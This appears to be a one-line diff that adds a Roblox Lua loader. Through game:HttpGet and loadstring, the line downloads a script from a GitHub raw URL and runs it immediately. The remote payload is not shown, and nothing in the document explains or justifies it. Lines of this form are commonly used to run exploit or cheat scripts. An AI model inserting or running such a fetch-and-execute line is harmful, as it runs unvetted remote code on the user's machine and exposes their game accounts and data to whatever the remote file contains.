@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spaminhalerfanwow-ship-it/mukbang.lua/refs/heads/main/raw.lua"))()
